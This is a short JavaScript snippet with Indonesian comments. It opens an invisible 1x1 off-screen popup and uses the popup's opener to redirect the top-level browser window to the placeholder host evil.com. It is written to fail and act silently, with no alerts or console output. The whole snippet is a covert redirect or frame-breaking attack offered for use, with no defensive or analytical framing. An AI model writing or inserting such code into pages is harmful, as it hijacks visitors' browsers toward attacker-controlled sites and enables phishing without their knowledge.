(function() {
  // Tidak ada console.log untuk menjaga kesenyapan
  try {
    // Membuka jendela popup sekecil mungkin dan di luar layar agar tidak terlihat.
    const newWin = window.open('', '_blank', 'width=1,height=1,left=9999,top=9999');
    
    if (!newWin) {
      // Jika popup diblokir, gagal secara senyap. Tidak ada alert.
      return;
    }

    // Langsung mencoba melakukan navigasi pada jendela utama (top window).
    // Ini adalah upaya paling cepat.
    newWin.opener.top.location.href = "https://www.evil.com";
    
    // Menutup popup segera setelah perintah dikirim.
    newWin.close( );

  } catch (e) {
    // Gagal secara senyap jika terjadi error (misalnya, karena cross-origin).
    // Tidak ada console.error atau alert.
  }
})();
